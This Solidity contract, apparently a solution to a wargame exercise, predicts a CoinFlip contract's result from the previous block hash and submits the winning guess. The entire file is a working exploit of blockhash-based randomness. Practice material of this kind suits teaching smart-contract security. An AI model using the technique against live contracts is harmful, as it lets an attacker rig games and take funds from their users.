// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './CoinFlip.sol';
import './node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol';

contract CoinFlipHack{

    using SafeMath for uint256;
    CoinFlip public targetContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetContract) {
        targetContract = CoinFlip(_targetContract);
    }

    function GuessFlip() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}